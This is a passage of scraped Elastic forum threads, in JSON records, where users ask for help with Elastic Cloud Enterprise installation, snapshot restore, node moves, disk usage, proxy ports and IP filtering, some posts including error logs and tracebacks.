      "Elastic Cloud Enterprise"
    ],
    "author": "Rob_wylde",
    "date": "December 24, 2019, 7:04pm December 29, 2019, 8:37pm December 29, 2019, 9:07pm December 30, 2019, 1:11am December 30, 2019, 1:16am January 2, 2020, 7:05pm January 16, 2020, 7:05pm",
    "body": "So I'm evaluating ECE and testing its abilities to restore from snapshot. So i had a functional ECE install with a number of deployments. All of which were sending snaps to minio regularly without issue. Before uninstalling ECE I ensure all of the deployments had recently been backed up to the S3 minio instance. I reinstall ECE and add my repository information again. I enable snapshots for one of the default deployments to ensure minio connectivity. The new deployment was successfully able to create and upload a snapshot. I move on to try and restore from a snapshot and none of my previous snaps are listed. I do not know what is going on here. Are there limitations to the ECE trial license that prevent me from restoring? I can confirm that the my previous deployments were running ELK stack 7.5 and that is the same target version that i'm trying to restore to. Snapshot Recovery on a Separate ECE Setup Does this still apply here? Are there any plans to make this process any better? As a user i expect to see the snapshots to be listed perhaps if they are unusable they can have a strike through or link to information as to why its being marked as unusable. Leaving me completely in the dark and searching forums for hours to ultimately find no good answers is very frustrating. Thanks",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "3c6f6774-bb95-4bc9-970c-e112865b58e9",
    "url": "https://discuss.elastic.co/t/ece-not-recognizing-docker-config-json/211844",
    "title": "ECE not recognizing docker config.json",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "December 13, 2019, 8:17pm December 14, 2019, 12:07am December 16, 2019, 1:49pm December 18, 2019, 7:10pm December 18, 2019, 7:48pm December 19, 2019, 2:23pm December 19, 2019, 3:02pm January 2, 2020, 3:01pm",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "158b82ff-06c0-4129-850a-950c9a564e2a",
    "url": "https://discuss.elastic.co/t/moving-nodes-updates-in-2-4-3/212240",
    "title": "Moving Nodes Updates in 2.4.3",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "daniel_a",
    "date": "December 17, 2019, 11:53pm December 18, 2019, 1:27pm December 18, 2019, 5:52pm December 18, 2019, 7:33pm December 18, 2019, 7:36pm December 18, 2019, 7:40pm December 18, 2019, 9:54pm January 1, 2020, 9:54pm",
    "body": "From the 2.4.3 ECE release note: Moving nodes off allocators for the system-owned deployments admin-console-elasticsearch and logging-and-metrics now works as expected. I've been trying to move Kibana, the one from logging-and-metrics from the existing allocators to the new ones, but I can't do it. Even though, I specify the new target location, I'm failing to move off Kibana. I moved all other nodes (10-15 nodes), but not Kibana node.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "f65728a8-b888-4c5d-8bf3-edc7d602bfc5",
    "url": "https://discuss.elastic.co/t/bootstrap-monitoring-process-did-not-exit-as-expected/208673",
    "title": "Bootstrap monitoring process did not exit as expected",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "logger",
    "date": "November 20, 2019, 10:15am November 20, 2019, 3:22pm November 20, 2019, 3:46pm November 20, 2019, 3:47pm November 20, 2019, 4:10pm November 20, 2019, 4:23pm November 21, 2019, 8:07am November 21, 2019, 8:17am November 21, 2019, 8:22am November 21, 2019, 3:36pm November 22, 2019, 2:13pm November 22, 2019, 6:49pm November 26, 2019, 12:53pm November 29, 2019, 9:57am December 2, 2019, 6:33am December 6, 2019, 5:58pm December 9, 2019, 1:47pm December 10, 2019, 5:10pm December 10, 2019, 8:25pm December 15, 2019, 10:52pm",
    "body": "Hi there, I try to install a \"large \". I started a few month ago with a small Installation and now we need to expand. For now I just try to install 2.4.2 on a new VM and it is not exiting without errors. But there are no errors. I used \"debug\" and evertything but there are no errors. I get a few warnings: -- Verifying Prerequisites -- Checking runner container does not exist... PASSED Checking host storage root volume path is not root... PASSED Checking host storage path is accessible... PASSED Checking host storage path contents matches whitelist... PASSED Checking Docker version... PASSED Checking Docker file system... PASSED Checking Docker storage driver... PASSED - The installation with overlay2 can proceed; however, we recommend using overlay Checking whether 'setuser' works inside a Docker container... PASSED Checking memory settings... PASSED Checking runner ip connectivity... PASSED Checking OS IPv4 IP forward setting... PASSED Checking OS max map count setting... PASSED Checking OS kernel version... PASSED - OS kernel version is 3.10.0-1062.4.1.el7.x86_64 but we recommend 4.4. Checking minimum required memory... PASSED Checking OS kernel cgroup.memory... PASSED - OS setting 'cgroup.memory' should be set to cgroup.memory=nokmem Checking OS minimum ephemeral port... PASSED Checking OS max open file descriptors per process... PASSED Checking OS max open file descriptors system-wide... PASSED Checking OS file system and Docker storage driver compatibility... PASSED Checking OS file system storage driver permissions... PASSED -- Completed Verifying Prerequisites -- And the exit notification is: - Exiting bootstrapper {} [2019-11-20 10:06:32,958][INFO ][no.found.util.LogApplicationExit$] Application is exiting {} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Errors have caused Elastic Cloud Enterprise installation to fail Bootstrap monitoring process did not exit as expected Traceback (most recent call last): File \"/elastic_cloud_apps/bootstrap-initiator/initiator.py\", line 88, in <module> exitcode = monitor.logging_and_bootstrap_monitor(bootstrap_properties, bootstrap_container_id, enable_debug) File \"/elastic_cloud_apps/bootstrap-initiator/bootstrap_initiator/monitor.py\", line 24, in logging_and_bootstrap_monitor raise BootstrapMonitoringException('Bootstrap monitoring process did not exit as expected') bootstrap_initiator.monitor.BootstrapMonitoringException: Bootstrap monitoring process did not exit as expected ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Now I dont know what to do. I tried removing and reinstalling everything new. So docker, ece, all permissions, etc.",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "ea8606df-e1f9-443c-a874-c7880f3beaea",
    "url": "https://discuss.elastic.co/t/ece-confusion-about-docker-storage-driver-to-use-overlay-or-overlay2/210927",
    "title": "ECE - Confusion about docker storage driver to use - overlay or overlay2?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ygirouard_stm",
    "date": "December 6, 2019, 6:58pm December 11, 2019, 2:42pm December 11, 2019, 4:07pm December 25, 2019, 4:09pm",
    "body": "Docker's documentation is clear: if possible and your kernel supports it, use overlay2 as the storage driver, as stated here: https://docs.docker.com/storage/storagedriver/overlayfs-driver/ Note : If you use OverlayFS, use the overlay2 driver rather than the overlay driver, because it is more efficient in terms of inode utilization. To use the new driver, you need version 4.0 or higher of the Linux kernel, or RHEL or CentOS using version 3.10.0-514 and above. However, ECE's documentation and installation script says otherwise and recommends overlay over overlay2 during the prereq check phase: Checking Docker storage driver... The installation with overlay2 can proceed; however, we recommend using overlay ... and, confusingly, the official Ansible playbook sets overlay2 as the storage driver when installing ECE on RHEL7. Why the discrepancy, and why recommend overlay over overlay2 when Docker themselves recommends otherwise?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c53362e4-d70f-490f-a928-f5498e3ab07c",
    "url": "https://discuss.elastic.co/t/ece-2-4-3-released/211338",
    "title": "ECE 2.4.3 released",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Przemyslaw_H",
    "date": "December 10, 2019, 4:58pm December 24, 2019, 4:58pm",
    "body": "We are pleased to announce that ECE 2.4.3 has been released today. This is a bug fix release. Release notes are available here",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "66bdb1b3-ded8-4778-bfb0-a06643710069",
    "url": "https://discuss.elastic.co/t/trouble-with-dashboard-import-in-ece-cluster/209983",
    "title": "Trouble with dashboard import in ECE cluster",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "mesiasc",
    "date": "November 29, 2019, 3:33pm November 29, 2019, 3:41pm December 2, 2019, 2:41pm December 2, 2019, 5:40pm December 2, 2019, 6:50pm December 3, 2019, 8:31am December 3, 2019, 9:12am December 17, 2019, 9:12am",
    "body": "Hi, I have an ECE deployment including one cluster that seems to be working fine. I have used APIs to interact with the kibana instance for example using curl to upload an index template. I tried to import a saved dashboard using curl, which gave me an error : 504 Gateway Time-out 504 Gateway Time-out The curl syntax has worked elsewhere but I tried doing the same from the Kibana UI in person and also got timeout behaviour. I tried splitting the dashboard file into its component parts and uploading them one at a time, but even a small file gives the same timeout behaviour. Could there be a reason the dashboard import is not working for me? How can I go about diagnosing what sounds like a load balancer / reverse proxy issue within ECE? Any ideas?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "9cd30d11-52e9-440f-b2f9-8db2cf5e7079",
    "url": "https://discuss.elastic.co/t/two-allocators-on-the-same-hardware/209502",
    "title": "Two allocators on the same hardware",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "lovegronvall",
    "date": "November 26, 2019, 12:17pm November 26, 2019, 1:54pm November 27, 2019, 6:39am November 27, 2019, 4:23pm December 11, 2019, 4:26pm",
    "body": "Did anyone successfully run more than one allocator on the same hardware? For example one using spinning disks and one on SSD?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "040e6f87-facd-4fc2-a715-8cd81b4c8783",
    "url": "https://discuss.elastic.co/t/node-move-failing-for-es/209203",
    "title": "Node Move Failing for ES",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Rob_wylde",
    "date": "November 24, 2019, 10:34pm November 25, 2019, 2:15pm November 25, 2019, 8:12pm November 27, 2019, 12:09am November 27, 2019, 12:09am December 10, 2019, 5:14pm",
    "body": "So i just setup another brand new instance of ECE and I'm following the same process i've used successfully in the past. That being install an 'admin' node with less resources than the other 3 nodes. Add the new allocators and once they all show up under platform -> allocators i try and Platform -> allocator -> {select first installed node} -> move nodes -> select all -> Move nodes but i get this error on the ES migrations. KB migation appears to work and can be validated on the allocator screen ece2.PNG2146×513 25.2 KB no.found.constructor.validation.ValidationException: 1. Can't apply a move_only plan with topology / setting changes. Actions: [settings] at no.found.constructor.validation.Validation$EveryError.asFailedFuture(Validation.scala:238) at no.found.constructor.steps.ValidatePlanPrerequisites$$anonfun$no$found$constructor$steps$ValidatePlanPrerequisites$$validateWithRetries$1$3.apply(ValidatePlanPrerequisites.scala:101) at no.found.constructor.steps.ValidatePlanPrerequisites$$anonfun$no$found$constructor$steps$ValidatePlanPrerequisites$$validateWithRetries$1$3.apply(ValidatePlanPrerequisites.scala:84) at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:253) at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:36) at no.found.concurrent.WrappedRunnable.run(ControllableExecutionContextWrapper.scala:80) at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39) at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415) at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) ece.PNG2912×1831 309 KB I've tried starting fresh and reinstalled a number of times, but i always get this error. Any suggestions? Thanks",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "c4ba9d45-5622-4964-ba04-a7e93f71be56",
    "url": "https://discuss.elastic.co/t/snapshots-are-failing-in-ece-minio/207553",
    "title": "Snapshots are failing in ECE minio",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "logger",
    "date": "November 12, 2019, 3:42pm November 12, 2019, 5:07pm November 13, 2019, 6:34am November 13, 2019, 7:06am November 13, 2019, 3:20pm November 15, 2019, 7:56pm November 19, 2019, 12:24pm November 19, 2019, 4:31pm November 20, 2019, 6:04am November 21, 2019, 5:32pm December 5, 2019, 5:32pm",
    "body": "Hi there, I have integrated a repository with minio. After I recognized that elasticsearch 6.x was not able to resolve hostnames I changed to IP. Elasticsearch 7.x worked fine for a while. I use version 2.4.1 and updated yesterday from 2.3.1. But the error has already been in 2.3.1. Now one deployment has some error by creating a snapshot. But it has 100 working snapshots already: Unknown s3 client name [cloud-REPONAME]. Existing client configs: Default In the advanced settings I see: \"snapshot\": { \"enabled\": true, \"repository\": { \"config\": { \"repository_id\": \"REPONAME\", \"snapshot_config_type\": \"reference\" } }, \"suspended\": {} } Why is in the Error message a \"cloud-\" prefix?",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "f42334c1-ed1e-4cc1-b7df-add1bd3789a9",
    "url": "https://discuss.elastic.co/t/elastic-cloud-architecture-selection-and-system-requirements-suggestion/208644",
    "title": "Elastic Cloud Architecture Selection and System Requirements Suggestion",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "firat.tekin",
    "date": "November 20, 2019, 7:43am November 20, 2019, 4:09pm December 4, 2019, 3:36pm",
    "body": "Hey there, I just tried Elastic Cloud service and looks like it meets my expectations. I want to ask some questions before further steps. I've got approximately 600GB of data currently, which strictly defined as \"keyword\" mapping for all of the fields. My data may be grow up to 1.4TB -even may be more in the future- and needed to be actively searchable in all indices. I can't decide some questions on my own. So I need suggestions about; 1- I liked the \"Hot-Warm Architecture\" with high storage offering. But I think, I need an architecture with no-warm nodes. As I said before, I need to actively search inside all indices with high search speed. Should I choose \"I/O Optimized Architecture\" instead of this? 2- If I need further storage in the future, can I easily increase the size of nodes or append new nodes without a need of extra configuration? Is Elastic Cloud supports distribution of data with the old nodes and the new? Like automatic reorganizing? 3- I really don't understood about \"Fault Tolerance\". Is that means, creating a new data node for replica shard usage only? Or, synchronizes my primary shards on my current data node with another machine in another zone - If your current data machine went down, it automatically serve you from our backup machine in another zone - status? Thanks, Note: I previously open a topic inside 'Elasticsearch' with same text. But after I found this section, I thought that my topic is more appropriate for here.Flagged old topic by, \"Content on wrong section\" already, but didn't get any response to this. So, I reopened it again here.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b9f4d378-d2a9-4ecd-a133-81cf73922dc0",
    "url": "https://discuss.elastic.co/t/hot-warm-cord-architecture/208176",
    "title": "Hot/Warm/Cord Architecture",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "daniel_a",
    "date": "November 16, 2019, 5:11pm November 18, 2019, 3:47pm November 18, 2019, 3:58pm November 18, 2019, 8:08pm December 2, 2019, 5:26pm",
    "body": "I'm trying to figure out what are the most optional ratios for each data storage. I'm aware about 30/100 ratios used for hot/warm storages in Elastic Cloud. I can't really find much information about the cold storage. What would be the recommended ratio for the cold storage in ECE? If I increase it, let's say to 120 and it's running on a slower hardware, would this downgrade performance to the point that my searches would take very long time to return? How searchable would be the data in the cold storage? If I use SSD drives for the hot storage, how much can I increase the hot storage ratio and still have solid performance? I totally understand that this will depend on specific requirements for each customer. I'm trying to see how much performance downgrade/upgrade with the ratio change. Is this something I can easily measure before making final decisions? --Thansk",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "06642bc9-8cba-4d75-8625-e917d5e60dea",
    "url": "https://discuss.elastic.co/t/api-key-ip-filtering-on-ece/207660",
    "title": "API Key, IP Filtering on ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "November 13, 2019, 8:57am November 14, 2019, 2:23am November 14, 2019, 2:23am November 28, 2019, 12:57am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "02df636e-9f7b-4e69-8d9f-0d27ca4d5115",
    "url": "https://discuss.elastic.co/t/api-console-auditing/207313",
    "title": "API Console Auditing",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "robrotheram",
    "date": "November 11, 2019, 9:26am November 11, 2019, 7:28pm November 12, 2019, 12:07pm November 12, 2019, 2:19pm November 26, 2019, 2:19pm",
    "body": "Hi there all deployments have a api console that uses the default elastic user to execute commands to the clusters. Is there any where that this is audited. IE something like user bob has executed command Post _search on cluster id XXXXXX If not is there away to disable this console. We have some very strict auditing requirements based on the data we hold",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "6c4d3773-a23a-4658-9aa0-4d8b51b1d43c",
    "url": "https://discuss.elastic.co/t/ece-aws-load-balancer-port-configuration/207129",
    "title": "ECE + AWS load balancer: port configuration?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "mesiasc",
    "date": "November 8, 2019, 2:31pm November 12, 2019, 10:04am November 12, 2019, 10:04am November 26, 2019, 10:04am",
    "body": "I have a load balancer in front of ECE to front the cluster URLs for kibana and elasticsearch. These all use port 9243 and the config in the ECE UI allows me to set a CNAME to be used instead of the ip.es.io service... This works and I can use the CloudID to configure beats etc. So far so good. But I would like to present the services not only on the domain of my choosing but move the port to a standard one - eg. 443, which would allow me to use the service through a corporate web proxy. I configure the load balancer to listen on 443 and target 9243. I can add the port assignment to the endpoint configuration / CNAME and it is accepted and the resulting CloudID seems right. But none of the links in the ECE UI work then. I suspect this is a bug. (I can manually make a CloudID including the port 443 using base64 that works with beats.) So far the least broken approach is to configure the endpoint without port, the links in ECE point to xxx:9243 which doesn't get through the proxy, but removing the :9243 then makes the link work. The manually modified CloudID also works to get beats to access elasticsearch over port 443. Is there any way to configure ECE to build URLs and CloudID with a specific port in addition to the specific endpoint?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "909f5b99-bf66-4acc-af77-d7a44de4f8f6",
    "url": "https://discuss.elastic.co/t/waiting-for-admin-cluster-to-become-reachable-after-os-upgrade-from-rhek-7-6-to-rhel-7-7/207343",
    "title": "Waiting for admin cluster to become reachable, after OS upgrade from rhek 7.6 to rhel 7.7",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "logger",
    "date": "November 11, 2019, 11:30am November 11, 2019, 7:17pm November 12, 2019, 7:49am November 26, 2019, 7:49am",
    "body": "Hi there, I had to upgrade the OS and for this I deleted the ECE completely like mentioned in the docs. It worked and I reinstalled and rejoined the node. In the UI I can see the runner and configure the roles. But it seems that it has an issue with the admin cluster and the Proxy. [2019-11-11 11:17:06,115][WARN ][spray.can.client.HttpHostConnectionSlot] Connection attempt to containerhost:9244 failed in response to POST request to /allocator-metricbeat-*/_search with no retries left, dispatching error... {} [2019-11-11 11:17:06,549][WARN ][spray.can.client.HttpHostConnectionSlot] Connection attempt to containerhost:9244 failed in response to GET request to /.migration/doc/lock with no retries left, dispatching error... {} [2019-11-11 11:17:06,549][INFO ][no.found.adminconsole.elasticsearch.IndexConfigurationActor] Waiting for admin cluster to become reachable ([Connection attempt to containerhost:9244 failed]). Retrying every [5 seconds]. {} spray.can.Http$ConnectionAttemptFailedException: Connection attempt to containerhost:9244 failed at spray.can.client.HttpHostConnectionSlot$$anonfun$connecting$1.applyOrElse(HttpHostConnectionSlot.scala:87) at akka.actor.Actor$class.aroundReceive(Actor.scala:502) at spray.can.client.HttpHostConnectionSlot.aroundReceive(HttpHostConnectionSlot.scala:33) at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526) at akka.actor.ActorCell.invoke(ActorCell.scala:495) at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257) at akka.dispatch.Mailbox.run(Mailbox.scala:224) at akka.dispatch.Mailbox.exec(Mailbox.scala:234) at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) It is not possible to expand the admin console to the host. Other deployments are working. And I cannot Login with its IP:12433. On this hosts I have added IPtables rules: Chain INPUT (policy ACCEPT) target prot opt source destination ACCEPT tcp -- anywhere anywhere multiport dports 12191:12201 /* 900 profile::linux::firewall::deny_unused accept 12191-12201 */ ACCEPT tcp -- anywhere anywhere multiport dports 12343 /* 900 profile::linux::firewall::deny_unused accept 12343 */ ACCEPT tcp -- anywhere anywhere multiport dports 12443 /* 900 profile::linux::firewall::deny_unused accept 12443 */ ACCEPT tcp -- anywhere anywhere multiport dports 12898:12908 /* 900 profile::linux::firewall::deny_unused accept 12898-12908 */ ACCEPT tcp -- anywhere anywhere multiport dports 13898:13908 /* 900 profile::linux::firewall::deny_unused accept 13898-13908 */ ACCEPT tcp -- anywhere anywhere multiport dports 18000:21999 /* 900 profile::linux::firewall::deny_unused accept 18000-21999 */ ACCEPT tcp -- anywhere anywhere multiport dports 2112/* 900 profile::linux::firewall::deny_unused accept 2112 */ ACCEPT tcp -- anywhere anywhere multiport dports ssh /* 900 profile::linux::firewall::deny_unused accept 22 */ ACCEPT tcp -- anywhere anywhere multiport dports 22191:22195 /* 900 profile::linux::firewall::deny_unused accept 22191-22195 */ ACCEPT tcp -- anywhere anywhere multiport dports 9243 /* 900 profile::linux::firewall::deny_unused accept 9243 */ ACCEPT tcp -- anywhere anywhere multiport dports 9343/* 900 profile::linux::firewall::deny_unused accept 9343 */ Does anyone has experience with this? Greetings Malte",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2bfd88e0-60c5-49fc-932c-df5639ee8eac",
    "url": "https://discuss.elastic.co/t/requirements-for-coordinator-and-director-hosts-and-proxies/207379",
    "title": "Requirements for coordinator and director hosts and proxies",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "logger",
    "date": "November 11, 2019, 3:15pm November 12, 2019, 6:02am November 25, 2019, 7:14pm",
    "body": "Hi, we want to switch from small \"small baseline installation\" to large. for this I need to know what disk requirements are needed for coordinator, director and proxies. I didnt find anything in the docs. Only about RAM. Greetings Malte",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9f8d98b5-4c2c-40f7-a16b-5cc14e13f9e5",
    "url": "https://discuss.elastic.co/t/sample-installation-runs-out-of-disk-indices-readonly/206953",
    "title": "Sample installation runs out of disk, indices readonly",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "mesiasc",
    "date": "November 7, 2019, 11:09am November 7, 2019, 9:48pm November 8, 2019, 9:57am November 12, 2019, 9:56am November 25, 2019, 7:11pm",
    "body": "A single host installation is running out of disk well before I would expect given the amount of data stored in clusters. However I am struggling to understand the contact points to use to diagnose this with ECE or eventually to control it. GET /_cluster/allocation/explain tells \"can_allocate\" : \"no, allocate_explanation\" : \"cannot allocate because allocation is not permitted to any of the nodes GET _cat/shards shows only some indices running to low hundreds of MB - totalling probably a couple of GB at the most GET _cat/allocation shows disk used 18.4GB avail 1.5GB Using df and du on the underlying ECE node on AWS suggests, the disk is filling. Surprisingly I found the proxyv2 directory was comparable in size to the allocator one - this looked suspicious. Drilling down deeper I found that the majority of the proxyv2 usage was uncompressed logs which were huge. So tactical question - how can I change the logging policy for proxy nodes to avoid storing these relatively useless logs or at the very least, compress them? And strategic question, what is best practice for storage management within ECE? I will delete some of these logs to get the ECE off its knees but would like a better solution.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "5ea3a763-4354-4e15-bab1-28d0c5f611c3",
    "url": "https://discuss.elastic.co/t/ece-upgrade-v2-3-2-to-v2-4-1/207262",
    "title": "ECE Upgrade v2.3.2 to v2.4.1",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Jugsofbeer",
    "date": "November 11, 2019, 1:49am November 25, 2019, 1:49am",
    "body": "Hi, Has anyone tried to do an upgrade on-premise, from ECE 2.3.2 to v2.4.1 on RHEL 7.5 with Docker 1.13? Does anyone have any feedback on how the new proxy has improved things in your environment ? We are just wanting to hear about other people's migrations and if there were any lessons learned that you can share. We have done a lot of reading of the documentation, but keen to hear from others.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4951cfb0-f426-405c-8ccb-96ed9337c60d",
    "url": "https://discuss.elastic.co/t/ece-medium-installation-example-aws-runner-ip-connectivity/206040",
    "title": "ECE medium installation example, AWS, runner ip connectivity",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "mesiasc",
    "date": "October 31, 2019, 1:02pm October 31, 2019, 6:45pm November 1, 2019, 6:51am November 7, 2019, 6:10pm November 7, 2019, 9:51pm November 8, 2019, 10:24am November 8, 2019, 10:25am November 22, 2019, 10:26am",
    "body": "I'm installing the second instance (step 3 here: https://www.elastic.co/guide/en/cloud-enterprise/current/ece-topology-example2.html) after the first instance seemed to install without problems. The second instance complains: Checking runner ip connectivity... FAILED Can't connect $RUNNER_HOST_IP [10.5.3.195:22000]: Connection refused [...] Errors have caused Elastic Cloud Enterprise installation to fail Some of the prerequisites failed: [runner ip connectivity], please fix before continuing I checked on the first instance and there isn't anything listening on this port: netstat -anpt|grep LISTEN|grep 22000 Any advice? Possibly relevant context. I'm using r5.xlarge instances. I had to manually set up docker as the cloud-init script to do this failed. Failed running /var/lib/cloud/scripts/per-instance/00-format-drives-enable-docker Possibly because of the storage being /dev/nvme1n1 Instead I manually did parted mklabel, mkpart, mkfs.xfs, mkdir /mnt/data, install /mnt/data, mount, make the sysctl edits, systemctl restart docker...",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "5bc3e8c3-90a1-49db-b4fb-bdbf7d38f389",
    "url": "https://discuss.elastic.co/t/cluster-health-not-reported-accurately-in-ece/206966",
    "title": "Cluster health not reported accurately in ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "mesiasc",
    "date": "November 7, 2019, 1:44pm November 7, 2019, 10:00pm November 8, 2019, 9:52am November 22, 2019, 9:52am",
    "body": "I have clusters where the health is degraded by indices in read only state. Clicking through to the individual deployment UI for those clusters, the health is often not reportedly the same state. Within ECE deployments top level page and within specific deployment UIs separately, the health is consistent, so I don't think the status is fluctuating. ECE top page seems to have a snapshot from some time in the past that bears little relation to the current status in Kibana. Clicking through to Kibana, one cluster that is Unhealthy at the top level and is Healthy at the individual level, has lifecycle errors against several indices. As context, the readonly state was probably induced by running out of storage. This has been addressed by deleting excessive uncompressed log files. The cluster in question has had: PUT _all/_settings { \"index\": { \"blocks\": { \"read_only_allow_delete\": \"false\" } } } to clear the readonly status. I believe there are no longer readonly indices on this cluster. What is going on with cluster health reporting?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9c0080e9-f887-4788-9299-eb90511ed0f5",
    "url": "https://discuss.elastic.co/t/change-docker-registry-and-repo-path/206422",
    "title": "Change docker registry and repo path",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "logger",
    "date": "November 4, 2019, 2:38pm November 4, 2019, 3:10pm November 6, 2019, 3:10pm November 20, 2019, 3:10pm",
    "body": "Hi there, we have a satellite server for our internal docker registry. When I setup ECE I can change the registry server but not the repository path. Unfortunatley we have a static path and cannot change it. satellite.company-registry.de:5000/company-name-elastic_cloud_enterprise-cloud-assets_elasticsearch:7.4.1-1 But the Syntax of the Installation script is docker pull ${DOCKER_REGISTRY}/${ECE_DOCKER_REPOSITORY}/elastic-cloud-enterprise:${CLOUD_ENTERPRISE_VERSION} As you can see we cannot combine this. Is there another way or another config where I can change this. Or do I have to change the Script within? Greetings Malte",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "40f47481-bb36-4e5a-9c59-b2b4b8aa828d",
    "url": "https://discuss.elastic.co/t/ip-filter-on-cloud-ui/206636",
    "title": "IP Filter on Cloud UI",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "logger",
    "date": "November 5, 2019, 3:54pm November 8, 2019, 7:09am November 20, 2019, 3:08pm",
    "body": "Hi there, I have tried a few things with IP filtering and I have a question about how can I restrict traffic to the cloud UI. We are using Terminalserver where we want to access the Cloud UI and block every other connection. For now I just tried to create a ruleset and added it to the \"admin-console-elasticsearch\". After that I was able to login but when I Login I get: There was a problem communicating with the system cluster. Origin status code [403 Forbidden]. So my question is, is there a way to restrict the Cloud UI with the IP-Filter and how?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "dbfd3aac-c53b-42d5-94ec-39f10103045c",
    "url": "https://discuss.elastic.co/t/collecting-specific-data-from-within-each-virtual-machine/206309",
    "title": "Collecting specific data from within each virtual machine",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "greavette",
    "date": "November 3, 2019, 11:53pm November 4, 2019, 10:49am November 18, 2019, 7:17am",
    "body": "Hello Forum, I've just begun to use Kibana (ELK) so my understanding is very limited at our company but I'm hoping this forum can educate me or lead me in the right direction. I have a need to collect various data from within each of our windows and Linux virtual machines such as what applications are installed and the version of these applications as well as other data to create various reports. Currently we use PowerShell and Bash scripts to connect to each server to collect this data. I'd like to have this data collected and placed into our ELK stack. Can ELK do this and if so how? Thank you in advance for any direction this forum can provide me",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "bf2b43b8-0d52-446f-a9c4-0555241583a4",
    "url": "https://discuss.elastic.co/t/snapshot-settings-interval/206097",
    "title": "Snapshot settings interval",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ryan_Downey",
    "date": "October 31, 2019, 8:13pm October 31, 2019, 8:17pm October 31, 2019, 9:14pm November 1, 2019, 12:28pm November 15, 2019, 12:14pm",
    "body": "Am I missing something here or are the directions to change the Snapshot settings interval just that poor. The 3rd, 4h and 5th steps dont even seem to exist when I'm on the deployment that I want to snapshot. I don't need the default 30 minute settings for this deployment. https://www.elastic.co/guide/en/cloud-enterprise/current/ece-snapshots.html#ece-change-snapshot-interval",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "fe82d68d-ec88-47fc-9049-ff9612b3314b",
    "url": "https://discuss.elastic.co/t/ip-filtering-api-not-showing-rulesets/205644",
    "title": "IP-Filtering API not showing rulesets",
    "category": [
      "Elastic Cloud Enterprise"
